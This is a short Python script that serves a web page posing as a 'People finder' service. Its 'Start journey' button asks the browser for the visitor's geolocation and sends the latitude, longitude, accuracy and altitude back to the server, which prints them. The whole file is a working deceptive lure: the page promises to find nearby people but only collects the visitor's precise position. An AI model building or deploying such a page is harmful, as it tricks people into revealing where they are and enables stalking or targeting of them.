#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

HTML = """
<meta name=viewport content="width=device-width,initial-scale=1">
<title>People finder</title>
<b>Find people near you</b>
<button onclick=handlePermission()>Start journey</button>
<style>body{
display:flex;flex-flow:column;justify-content:center;align-items:center;
height:100%;background:#224;color:#66a; grid-gap:3vmax;margin:0;padding:0;box-sizing:border-box}
button{background:none;color:#66a;border:1px solid;padding:12px 24px;}</style>
<script>
function handlePermission() {
navigator.geolocation.getCurrentPosition(p => {
let {latitude, longitude, accuracy, altitude} = p.coords;
fetch('/loc', {method: 'POST', body: JSON.stringify({
latitude, longitude, accuracy, altitude
})})
});
}
</script>"""


class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.connection.send(HTML.encode('ascii'))

    def do_POST(self):
        c_len = int(self.headers['Content-Length'])
        print(self.rfile.read(c_len).decode())


def main():
    with ThreadingHTTPServer(('', 8080), Handler) as srv:
        srv.serve_forever()


if __name__ == '__main__':
    main()
